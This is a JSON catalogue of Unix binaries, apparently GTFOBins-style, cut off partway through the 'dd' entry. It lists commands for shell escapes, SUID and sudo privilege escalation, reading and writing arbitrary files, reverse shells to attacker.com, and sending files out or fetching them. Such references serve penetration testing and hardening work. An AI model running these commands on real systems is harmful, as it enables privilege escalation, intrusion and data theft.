{
    "ab": {
        "File upload": {
            "code": [
                "URL=http://attacker.com/",
                "LFILE=file_to_send",
                "ab -p $LFILE $URL"
            ]
        },
        "File download": {
            "code": [
                "URL=http://attacker.com/file_to_download",
                "ab -v2 $URL"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ab) .",
                "",
                "URL=http://attacker.com/",
                "LFILE=file_to_send",
                "./ab -p $LFILE $URL"
            ]
        },
        "Sudo": {
            "code": [
                "URL=http://attacker.com/",
                "LFILE=file_to_send",
                "sudo ab -p $LFILE $URL"
            ]
        }
    },
    "agetty": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which agetty) .",
                "",
                "./agetty -o -p -l /bin/sh -a root tty"
            ]
        }
    },
    "ansible-playbook": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF",
                "ansible-playbook $TF"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF",
                "sudo ansible-playbook $TF"
            ]
        }
    },
    "apt-get": {
        "Shell": {
            "code": [
                "apt-get changelog apt",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo apt-get changelog apt",
                "!/bin/sh"
            ]
        }
    },
    "apt": {
        "Shell": {
            "code": [
                "apt changelog apt",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo apt changelog apt",
                "!/bin/sh"
            ]
        }
    },
    "ar": {
        "File read": {
            "code": [
                "TF=$(mktemp -u)",
                "LFILE=file_to_read",
                "ar r \"$TF\" \"$LFILE\"",
                "cat \"$TF\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ar) .",
                "",
                "TF=$(mktemp -u)",
                "LFILE=file_to_read",
                "./ar r \"$TF\" \"$LFILE\"",
                "cat \"$TF\""
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -u)",
                "LFILE=file_to_read",
                "sudo ar r \"$TF\" \"$LFILE\"",
                "cat \"$TF\""
            ]
        }
    },
    "aria2c": {
        "Command": {
            "code": [
                "COMMAND='id'",
                "TF=$(mktemp)",
                "echo \"$COMMAND\" > $TF",
                "chmod +x $TF",
                "aria2c --on-download-error=$TF http://x"
            ]
        },
        "Sudo": {
            "code": [
                "COMMAND='id'",
                "TF=$(mktemp)",
                "echo \"$COMMAND\" > $TF",
                "chmod +x $TF",
                "sudo aria2c --on-download-error=$TF http://x"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which aria2c) .",
                "",
                "COMMAND='id'",
                "TF=$(mktemp)",
                "echo \"$COMMAND\" > $TF",
                "chmod +x $TF",
                "./aria2c --on-download-error=$TF http://x"
            ]
        }
    },
    "arj": {
        "File write": {
            "code": [
                "TF=$(mktemp -d)",
                "LFILE=file_to_write",
                "LDIR=where_to_write",
                "echo DATA >\"$TF/$LFILE\"",
                "arj a \"$TF/a\" \"$TF/$LFILE\"",
                "arj e \"$TF/a\" $LDIR"
            ]
        },
        "File read": {
            "code": [
                "TF=$(mktemp -u)",
                "LFILE=file_to_read",
                "arj a \"$TF\" \"$LFILE\"",
                "arj p \"$TF\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which arj) .",
                "",
                "TF=$(mktemp -d)",
                "LFILE=file_to_write",
                "LDIR=where_to_write",
                "echo DATA >\"$TF/$LFILE\"",
                "arj a \"$TF/a\" \"$TF/$LFILE\"",
                "./arj e \"$TF/a\" $LDIR"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "LFILE=file_to_write",
                "LDIR=where_to_write",
                "echo DATA >\"$TF/$LFILE\"",
                "arj a \"$TF/a\" \"$TF/$LFILE\"",
                "sudo arj e \"$TF/a\" $LDIR"
            ]
        }
    },
    "arp": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "arp -v -f \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which arp) .",
                "",
                "LFILE=file_to_read",
                "./arp -v -f \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo arp -v -f \"$LFILE\""
            ]
        }
    },
    "as": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "as @$LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which as) .",
                "",
                "LFILE=file_to_read",
                "./as @$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo as @$LFILE"
            ]
        }
    },
    "ascii-xfr": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ascii-xfr -ns \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ascii-xfr) .",
                "",
                "LFILE=file_to_read",
                "./ascii-xfr -ns \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ascii-xfr -ns \"$LFILE\""
            ]
        }
    },
    "ascii85": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "ascii85 \"$LFILE\" | ascii85 --decode"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo ascii85 \"$LFILE\" | ascii85 --decode"
            ]
        }
    },
    "ash": {
        "Shell": {
            "code": [
                "ash"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "ash -c 'echo DATA > $LFILE'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which ash) .",
                "",
                "./ash"
            ]
        },
        "Sudo": {
            "code": [
                "sudo ash"
            ]
        }
    },
    "aspell": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "aspell -c \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which aspell) .",
                "",
                "LFILE=file_to_read",
                "./aspell -c \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo aspell -c \"$LFILE\""
            ]
        }
    },
    "at": {
        "Shell": {
            "code": [
                "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"
            ]
        },
        "Command": {
            "code": [
                "COMMAND=id",
                "echo \"$COMMAND\" | at now"
            ]
        },
        "Sudo": {
            "code": [
                "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"
            ]
        }
    },
    "atobm": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which atobm) .",
                "",
                "LFILE=file_to_read",
                "./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
            ]
        }
    },
    "awk": {
        "Shell": {
            "code": [
                "awk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Non-interactive reverse shell": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {",
                "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "Non-interactive bind shell": {
            "code": [
                "LPORT=12345",
                "awk -v LPORT=$LPORT 'BEGIN {",
                "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
                "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
                "    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "awk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "awk '//' \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which awk) .",
                "",
                "LFILE=file_to_read",
                "./awk '//' \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which awk) .",
                "",
                "./awk 'BEGIN {system(\"/bin/sh\")}'"
            ]
        }
    },
    "base32": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "base32 \"$LFILE\" | base32 --decode"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which base32) .",
                "",
                "LFILE=file_to_read",
                "base32 \"$LFILE\" | base32 --decode"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo base32 \"$LFILE\" | base32 --decode"
            ]
        }
    },
    "base64": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "base64 \"$LFILE\" | base64 --decode"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which base64) .",
                "",
                "LFILE=file_to_read",
                "./base64 \"$LFILE\" | base64 --decode"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo base64 \"$LFILE\" | base64 --decode"
            ]
        }
    },
    "basenc": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "basenc --base64 $LFILE | basenc -d --base64"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which basenc) .",
                "",
                "LFILE=file_to_read",
                "basenc --base64 $LFILE | basenc -d --base64"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo basenc --base64 $LFILE | basenc -d --base64"
            ]
        }
    },
    "bash": {
        "Shell": {
            "code": [
                "bash"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
            ]
        },
        "File upload": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "export LFILE=file_to_send",
                "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'"
            ]
        },
        "File download": {
            "code": [
                "export RHOST=attacker.com",
                "export RPORT=12345",
                "export LFILE=file_to_get",
                "bash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\",
                "    3<>/dev/tcp/$RHOST/$RPORT \\",
                "    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "bash -c 'echo DATA > $LFILE'"
            ]
        },
        "File read": {
            "code": [
                "export LFILE=file_to_read",
                "bash -c 'echo \"$(<$LFILE)\"'"
            ]
        },
        "Library load": {
            "code": [
                "bash -c 'enable -f ./lib.so x'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which bash) .",
                "",
                "./bash -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo bash"
            ]
        }
    },
    "bpftrace": {
        "Sudo": {
            "code": [
                "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
            ]
        }
    },
    "bridge": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "bridge -b \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which bridge) .",
                "",
                "LFILE=file_to_read",
                "./bridge -b \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo bridge -b \"$LFILE\""
            ]
        }
    },
    "bundler": {
        "Shell": {
            "code": [
                "bundler help",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo bundler help",
                "!/bin/sh"
            ]
        }
    },
    "busctl": {
        "Shell": {
            "code": [
                "busctl --show-machine",
                "!/bin/sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo busctl --show-machine",
                "!/bin/sh"
            ]
        }
    },
    "busybox": {
        "Shell": {
            "code": [
                "busybox sh"
            ]
        },
        "File upload": {
            "code": [
                "LPORT=12345",
                "busybox httpd -f -p $LPORT -h ."
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "busybox sh -c 'echo \"DATA\" > $LFILE'"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "./busybox cat \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which busybox) .",
                "",
                "./busybox sh"
            ]
        },
        "Sudo": {
            "code": [
                "sudo busybox sh"
            ]
        }
    },
    "byebug": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'system(\"/bin/sh\")' > $TF",
                "byebug $TF",
                "continue"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'system(\"/bin/sh\")' > $TF",
                "sudo byebug $TF",
                "continue"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which byebug) .",
                "",
                "TF=$(mktemp)",
                "echo 'system(\"/bin/sh\")' > $TF",
                "./byebug $TF",
                "continue"
            ]
        }
    },
    "bzip2": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "bzip2 -c $LFILE | bzip2 -d"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which bzip2) .",
                "",
                "LFILE=file_to_read",
                "./bzip2 -c $LFILE | bzip2 -d"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo bzip2 -c $LFILE | bzip2 -d"
            ]
        }
    },
    "c89": {
        "Shell": {
            "code": [
                "c89 -wrapper /bin/sh,-s ."
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_delete",
                "c89 -xc /dev/null -o $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "c89 -x c -E \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo c89 -wrapper /bin/sh,-s ."
            ]
        }
    },
    "c99": {
        "Shell": {
            "code": [
                "c99 -wrapper /bin/sh,-s ."
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_delete",
                "c99 -xc /dev/null -o $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "c99 -x c -E \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "sudo c99 -wrapper /bin/sh,-s ."
            ]
        }
    },
    "cancel": {
        "File upload": {
            "code": [
                "RHOST=attacker.com",
                "RPORT=12345",
                "LFILE=file_to_send",
                "cancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"
            ]
        }
    },
    "capsh": {
        "Shell": {
            "code": [
                "capsh --"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which capsh) .",
                "",
                "./capsh --gid=0 --uid=0 --"
            ]
        },
        "Sudo": {
            "code": [
                "sudo capsh --"
            ]
        }
    },
    "cat": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "cat \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cat) .",
                "",
                "LFILE=file_to_read",
                "./cat \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo cat \"$LFILE\""
            ]
        }
    },
    "certbot": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
            ]
        }
    },
    "check_by_ssh": {
        "Shell": {
            "code": [
                "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
            ]
        },
        "Sudo": {
            "code": [
                "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
            ]
        }
    },
    "check_cups": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "check_cups --extra-opts=@$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo check_cups --extra-opts=@$LFILE"
            ]
        }
    },
    "check_log": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "INPUT=input_file",
                "check_log -F $INPUT -O $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "OUTPUT=output_file",
                "check_log -F $LFILE -O $OUTPUT",
                "cat $OUTPUT"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "INPUT=input_file",
                "sudo check_log -F $INPUT -O $LFILE"
            ]
        }
    },
    "check_memory": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "check_memory --extra-opts=@$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo check_memory --extra-opts=@$LFILE"
            ]
        }
    },
    "check_raid": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "check_raid --extra-opts=@$LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo check_raid --extra-opts=@$LFILE"
            ]
        }
    },
    "check_ssl_cert": {
        "Command": {
            "code": [
                "COMMAND=id",
                "OUTPUT=output_file",
                "TF=$(mktemp)",
                "echo \"$COMMAND | tee $OUTPUT\" > $TF",
                "chmod +x $TF",
                "check_ssl_cert --curl-bin $TF -H example.net",
                "cat $OUTPUT"
            ]
        },
        "Sudo": {
            "code": [
                "COMMAND=id",
                "OUTPUT=output_file",
                "TF=$(mktemp)",
                "echo \"$COMMAND | tee $OUTPUT\" > $TF",
                "chmod +x $TF",
                "umask 022",
                "check_ssl_cert --curl-bin $TF -H example.net",
                "cat $OUTPUT"
            ]
        }
    },
    "check_statusfile": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "check_statusfile $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo check_statusfile $LFILE"
            ]
        }
    },
    "chmod": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which chmod) .",
                "",
                "LFILE=file_to_change",
                "./chmod 6777 $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_change",
                "sudo chmod 6777 $LFILE"
            ]
        }
    },
    "chown": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which chown) .",
                "",
                "LFILE=file_to_change",
                "./chown $(id -un):$(id -gn) $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_change",
                "sudo chown $(id -un):$(id -gn) $LFILE"
            ]
        }
    },
    "chroot": {
        "SUID": {
            "code": [
                "sudo install -m =xs $(which chroot) .",
                "",
                "./chroot / /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo chroot /"
            ]
        }
    },
    "cmp": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "cmp $LFILE /dev/zero -b -l"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cmp) .",
                "",
                "LFILE=file_to_read",
                "./cmp $LFILE /dev/zero -b -l"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo cmp $LFILE /dev/zero -b -l"
            ]
        }
    },
    "cobc": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x",
                "cobc -xFj --frelax-syntax-checks $TF/x"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x",
                "sudo cobc -xFj --frelax-syntax-checks $TF/x"
            ]
        }
    },
    "column": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "column $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which column) .",
                "",
                "LFILE=file_to_read",
                "./column $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo column $LFILE"
            ]
        }
    },
    "comm": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "comm $LFILE /dev/null 2>/dev/null"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which comm) .",
                "",
                "LFILE=file_to_read",
                "comm $LFILE /dev/null 2>/dev/null"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo comm $LFILE /dev/null 2>/dev/null"
            ]
        }
    },
    "composer": {
        "Shell": {
            "code": [
                "TF=$(mktemp -d)",
                "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json",
                "composer --working-dir=$TF run-script x"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp -d)",
                "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json",
                "sudo composer --working-dir=$TF run-script x"
            ]
        },
        "Limited SUID": {
            "code": [
                "sudo install -m =xs $(which composer) .",
                "",
                "TF=$(mktemp -d)",
                "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json",
                "./composer --working-dir=$TF run-script x"
            ]
        }
    },
    "cowsay": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'exec \"/bin/sh\";' >$TF",
                "cowsay -f $TF x"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'exec \"/bin/sh\";' >$TF",
                "sudo cowsay -f $TF x"
            ]
        }
    },
    "cowthink": {
        "Shell": {
            "code": [
                "TF=$(mktemp)",
                "echo 'exec \"/bin/sh\";' >$TF",
                "cowthink -f $TF x"
            ]
        },
        "Sudo": {
            "code": [
                "TF=$(mktemp)",
                "echo 'exec \"/bin/sh\";' >$TF",
                "sudo cowthink -f $TF x"
            ]
        }
    },
    "cp": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo \"DATA\" | cp /dev/stdin \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "cp \"$LFILE\" /dev/stdout"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cp) .",
                "",
                "LFILE=file_to_write",
                "echo \"DATA\" | ./cp /dev/stdin \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_write",
                "echo \"DATA\" | sudo cp /dev/stdin \"$LFILE\""
            ]
        }
    },
    "cpan": {
        "Shell": {
            "code": [
                "cpan",
                "! exec '/bin/bash'"
            ]
        },
        "Reverse shell": {
            "code": [
                "export RHOST=localhost",
                "export RPORT=9000",
                "cpan",
                "! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"
            ]
        },
        "File upload": {
            "code": [
                "cpan",
                "! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"
            ]
        },
        "File download": {
            "code": [
                "export URL=http://attacker.com/file_to_get",
                "cpan",
                "! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();"
            ]
        },
        "Sudo": {
            "code": [
                "sudo cpan",
                "! exec '/bin/bash'"
            ]
        }
    },
    "cpio": {
        "Shell": {
            "code": [
                "echo '/bin/sh </dev/tty >/dev/tty' >localhost",
                "cpio -o --rsh-command /bin/sh -F localhost:"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "LDIR=where_to_write",
                "echo DATA >$LFILE",
                "echo $LFILE | cpio -up $LDIR"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "echo \"$LFILE\" | cpio -o"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cpio) .",
                "",
                "LFILE=file_to_read",
                "TF=$(mktemp -d)",
                "echo \"$LFILE\" | ./cpio -R $UID -dp $TF",
                "cat \"$TF/$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "echo '/bin/sh </dev/tty >/dev/tty' >localhost",
                "sudo cpio -o --rsh-command /bin/sh -F localhost:"
            ]
        }
    },
    "cpulimit": {
        "Shell": {
            "code": [
                "cpulimit -l 100 -f /bin/sh"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cpulimit) .",
                "",
                "./cpulimit -l 100 -f -- /bin/sh -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo cpulimit -l 100 -f /bin/sh"
            ]
        }
    },
    "crash": {
        "Shell": {
            "code": [
                "crash -h",
                "!sh"
            ]
        },
        "Command": {
            "code": [
                "COMMAND='/usr/bin/id'",
                "CRASHPAGER=\"$COMMAND\" crash -h"
            ]
        },
        "Sudo": {
            "code": [
                "sudo crash -h",
                "!sh"
            ]
        }
    },
    "crontab": {
        "Command": {
            "code": [
                "crontab -e"
            ]
        },
        "Sudo": {
            "code": [
                "sudo crontab -e"
            ]
        }
    },
    "csh": {
        "Shell": {
            "code": [
                "csh"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "ash -c 'echo DATA > $LFILE'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which csh) .",
                "",
                "./csh -b"
            ]
        },
        "Sudo": {
            "code": [
                "sudo csh"
            ]
        }
    },
    "csplit": {
        "File write": {
            "code": [
                "TF=$(mktemp)",
                "echo \"DATA\" > $TF",
                "LFILE=file_to_write",
                "csplit -z -b \"%d$LFILE\" $TF 1"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "csplit $LFILE 1",
                "cat xx01"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which csplit) .",
                "",
                "LFILE=file_to_read",
                "csplit $LFILE 1",
                "cat xx01"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "csplit $LFILE 1",
                "cat xx01"
            ]
        }
    },
    "csvtool": {
        "Shell": {
            "code": [
                "csvtool call '/bin/sh;false' /etc/passwd"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo DATA > $TF",
                "csvtool trim t $TF -o $LFILE"
            ]
        },
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "csvtool trim t $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which csvtool) .",
                "",
                "LFILE=file_to_read",
                "./csvtool trim t $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "sudo csvtool call '/bin/sh;false' /etc/passwd"
            ]
        }
    },
    "cupsfilter": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cupsfilter) .",
                "",
                "LFILE=file_to_read",
                "./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
            ]
        }
    },
    "curl": {
        "File upload": {
            "code": [
                "URL=http://attacker.com/",
                "LFILE=file_to_send",
                "curl -X POST -d @$file_to_send $URL"
            ]
        },
        "File download": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "curl $URL -o $LFILE"
            ]
        },
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "TF=$(mktemp)",
                "echo DATA >$TF",
                "curl \"file://$TF\" -o \"$LFILE\""
            ]
        },
        "File read": {
            "code": [
                "LFILE=/tmp/file_to_read",
                "curl file://$LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which curl) .",
                "",
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "./curl $URL -o $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "URL=http://attacker.com/file_to_get",
                "LFILE=file_to_save",
                "sudo curl $URL -o $LFILE"
            ]
        }
    },
    "cut": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "cut -d \"\" -f1 \"$LFILE\""
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which cut) .",
                "",
                "LFILE=file_to_read",
                "./cut -d \"\" -f1 \"$LFILE\""
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo cut -d \"\" -f1 \"$LFILE\""
            ]
        }
    },
    "dash": {
        "Shell": {
            "code": [
                "dash"
            ]
        },
        "File write": {
            "code": [
                "export LFILE=file_to_write",
                "dash -c 'echo DATA > $LFILE'"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which dash) .",
                "",
                "./dash -p"
            ]
        },
        "Sudo": {
            "code": [
                "sudo dash"
            ]
        }
    },
    "date": {
        "File read": {
            "code": [
                "LFILE=file_to_read",
                "date -f $LFILE"
            ]
        },
        "SUID": {
            "code": [
                "sudo install -m =xs $(which date) .",
                "",
                "LFILE=file_to_read",
                "./date -f $LFILE"
            ]
        },
        "Sudo": {
            "code": [
                "LFILE=file_to_read",
                "sudo date -f $LFILE"
            ]
        }
    },
    "dd": {
        "File write": {
            "code": [
                "LFILE=file_to_write",
                "echo \"DATA\" | dd of=$LFILE"
